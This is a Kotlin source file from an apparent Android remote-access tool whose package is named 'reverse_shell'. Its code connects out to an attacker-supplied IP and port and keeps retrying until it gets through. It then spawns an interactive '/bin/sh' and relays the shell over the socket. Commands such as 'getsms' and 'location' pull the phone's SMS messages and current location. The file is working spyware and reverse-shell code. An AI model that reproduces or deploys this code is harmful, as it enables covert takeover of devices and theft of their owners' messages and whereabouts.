package com.ironclad.saksham.reverse_shell

import android.content.Context
import android.os.Build
import androidx.annotation.RequiresApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.IOException
import java.io.InputStream
import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.Socket

@RequiresApi(Build.VERSION_CODES.P)
suspend fun establishReverseTcp(ip: String, port: Int, retryInterval:Long, context: Context){

    val isSocketConnected = MutableStateFlow(false)

    withContext(Dispatchers.IO) {
        isSocketConnected.collect{ isConnected->
            launch {
                if(!isConnected){
                    try{
                        val socket = establishSocketConnection(ip, port, retryInterval)
                        isSocketConnected.value = true
                        handleShellInteraction(socket, context)
                    }
                    catch (e:IOException){
                        isSocketConnected.value = false
                        println(e.message)
                    }
                }
            }
        }
    }
}


@RequiresApi(Build.VERSION_CODES.P)
private suspend fun handleShellInteraction(socket: Socket, context: Context)= withContext(Dispatchers.IO){

    val process = Runtime.getRuntime().exec(arrayOf("/bin/sh", "-i"))

    val shellInput = process.inputStream
    val shellError = process.errorStream
    val shellOutput = process.outputStream

    val socketInput = socket.getInputStream()
    val socketOutput = socket.getOutputStream()
    val socketReader = socketInput.bufferedReader()

    while (true) {
        while (shellInput.available() > 0) {
            socketOutput.write(shellInput.read())
        }

        while (shellError.available() > 0) {
            socketOutput.write(shellError.read())
        }

        while (socketInput.available() > 0) {
            val command = socketReader.readLine()
            executeCommand(command, socketOutput, socketInput, shellOutput, socket, process, context)
        }
        socketOutput.flush()
        shellOutput.flush()
    }
}


@RequiresApi(Build.VERSION_CODES.P)
private suspend fun executeCommand(
    command: String,
    socketOutput: OutputStream,
    socketInput: InputStream,
    shellOutput: OutputStream,
    socket: Socket,
    process: Process,
    context: Context
) {
    when (command) {
        "sysinfo" -> CommandHandler.handleSysInfo(socketOutput, shellOutput)
        "checkroot" -> CommandHandler.handleCheckRoot(socketOutput, shellOutput)
        "help" -> CommandHandler.handleHelp(socketOutput, shellOutput)
        "getsms" -> CommandHandler.handleGetSms(socketOutput, context, shellOutput)
        "exit" -> CommandHandler.handleExit(socket, process)
//        "writeit"-> CommandHandler.handleWriteToFile(socketOutput,context, shellOutput)
        "location"-> CommandHandler.handleCurrentLocation(context, socketOutput, shellOutput)
        else -> {
            if (command.startsWith("download")) {
//                CommandHandler.handleDownload(command, socketOutput, socketInput)
            }
            else {
                CommandHandler.handleShellCommand(command, shellOutput, socketOutput)
            }
        }
    }
}


private suspend fun establishSocketConnection(host: String, port: Int, retryInterval:Long): Socket {
    var socket: Socket? = null
    while (true) {
        try {
            if (socket?.isConnected != true) {
                println("Attempting to connect...")
                socket = Socket()
                withContext(Dispatchers.IO) {
                    socket.connect(InetSocketAddress(host, port), 2000)
                }
                if (socket.isConnected) {
                    println("Connected successfully!")
                    return socket
                }
            }
        } catch (e: Exception) {
            println("Failed to connect. Retrying in ${retryInterval/1000} seconds...")
        }
        delay(retryInterval)
    }
}












